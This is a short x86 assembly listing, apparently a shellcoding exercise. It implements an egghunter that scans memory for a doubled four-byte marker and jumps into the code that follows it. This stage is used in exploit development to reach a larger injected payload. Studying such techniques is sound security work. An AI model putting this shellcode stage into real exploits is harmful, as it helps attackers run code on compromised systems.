global _start			

section .text

_start:
	call jcp

prepare:
	pop eax
	mov ebx, 0x42904a90 ;egg=INC EDX, NOP, DEC EDX, NOP
	
search_the_egg:
	inc eax
	cmp dword [eax], ebx 
	jne search_the_egg 

	cmp dword[eax+4], ebx 
	jne search_the_egg 

	jmp eax 

jcp:
	jmp prepare
